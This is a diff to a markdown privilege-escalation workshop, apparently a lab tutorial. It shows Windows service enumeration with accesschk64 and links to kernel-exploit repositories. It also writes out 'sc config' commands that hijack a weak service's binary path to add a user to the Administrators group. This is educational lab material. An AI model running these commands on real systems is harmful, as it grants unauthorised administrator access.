@@ -131,7 +131,7 @@ VulnStatus : Appears Vulnerable
 
 ```
 
-#### **#2 Step | 🎯 Exploit**
+#### **#2 Step | Escalation 🏹**
 #####❗️ We can download exploit via <a href="https://www.exploit-db.com/searchsploit" target="_blank">searchploit</a> tool then compile this or use compiled exploit from the <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">here</a>. 
 ---
 
@@ -167,20 +167,30 @@ VulnStatus : Appears Vulnerable
 
     - Download the file in a zip format to your local (attacker) machine from `https://download.sysinternals.com/files/AccessChk.zip` then extract.
      - Transfer the `accesschk64.exe` executable file to the target machine. [How transfer file to target machine ?](link)
-     -  After, execute the script on the target machine with spesial flag as shown below (<font color="red">In our cases username is user</font>).
+     -  After, execute the script on the target machine with spesial flag as shown below (<font color="red">in our case system's username is a `user`</font>).
      ```cmd
-     powershell.exe -nop -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+     accesschk64.exe -uwcqv "user" *  -accepteula
      ```
+     - Then, we get list of vulnerable services list which we can access.
 
-```mermaid
-graph TD;
-  A-->B;
-  A-->C;
-  B-->D;
-  C-->D;
-```
-    
+        [![Accesschk services](https://raw.githubusercontent.com/chmodx/WinNixPE-workshop/master/media/accesschk-result.png)]()
 
+#### **#2 Step | Escalation 🏹**
+- After the information gathering phase, we recognize `daclsvc` service as vulnerable. We can access for change path. 
+    + Execute the commands on the target machine as shown below.
+        * Verify ☑️
+            ```cmd
+            sc qc daclsvc
+            ```
+        * Change path to our payload (add user to admin group), then start service 🧨
+            ```cmd
+            sc config daclsvc binpath= "net localgroup administrators user /add"
+            ```
+            ```cmd
+            sc start daclsvc
+            ```
+
+---
 
 ---
 
